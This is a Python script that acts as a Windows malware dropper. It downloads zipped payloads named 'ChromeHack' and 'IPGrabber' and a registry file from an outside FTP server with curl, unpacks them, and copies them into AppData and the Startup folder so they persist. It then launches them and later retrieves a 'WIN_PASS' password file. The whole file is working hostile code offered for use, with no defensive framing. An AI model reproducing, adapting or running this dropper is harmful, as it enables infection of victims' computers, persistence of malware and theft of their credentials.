import os
import shutil
import zipfile
from dotenv import load_dotenv
import time
global USERNAME,PASSWORD,home,extension,malwares

#make sure to encrypt the .env file contents later
#make sure to force create enviromental variable for further use

if os.name == "nt":

    load_dotenv()
    USERNAME = os.getenv("FTP_USERNAME")
    PASSWORD = os.getenv("FTP_PASSWORD")


    value = dict(os.environ)
    userprofile = value["USERPROFILE"]
    compuser = value["COMPUTERNAME"]
    home = value["HOMEDRIVE"]+value["HOMEPATH"]

    #once all malwares are done add to list
    malwares = ["ChromeHack","IPGrabber"]
    #remove .py after compiling malwares
    extension = [".zip",".py",".exe"]

    def download_malware():
        os.chdir(home+"\\Desktop\\Test")
        for i in range(len(malwares)):
            os.system(f"curl -v -u {USERNAME}:{PASSWORD} -o {malwares[i]}{extension[0]}  ftp://epiz_32211127@ftpupload.net/htdocs/Downloads/{malwares[i]}")
            with zipfile.ZipFile(os.getcwd()+"\\"+malwares[i]+extension[0], 'r') as zip_ref:
                zip_ref.extractall(home+"\\Desktop\\Test")
        zip_ref.close()
        os.chdir("C:")
        os.system(f"curl -v -u {USERNAME}:{PASSWORD} -o important.reg  ftp://epiz_32211127@ftpupload.net/htdocs/Regfile/important.reg")
        os.chdir(home+"\\Desktop\\Test")

    def move_malware():
        for i in range(len(malwares)):
            try:
                filepath = home+"\\Desktop\\Test\\"+malwares[i]+"\\"+malwares[i]
                shutil.copyfile(filepath,home+"\\AppData\\Local\\Programs\\"+os.path.basename(filepath))
                shutil.move(filepath,"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            except IOError:
                open_malware()
                return
        open_malware()

    def open_malware():
        for i in range(len(malwares)):
            os.startfile(home+"\\Desktop\\Test\\"+malwares[i]+extension[1])
            time.sleep(10)
        time.sleep((24*60)*60)
        os.system(f"curl -v -u {USERNAME}:{PASSWORD} -o {home}\\Desktop\\Test\\passwords.txt  ftp://epiz_32211127@ftpupload.net/htdocs/WIN_PASS")
        os.chdir(home+"\\Desktop\\Test")
        with open("passwords.txt","r") as file:
            admin = file.read()

    

    download_malware()
    move_malware()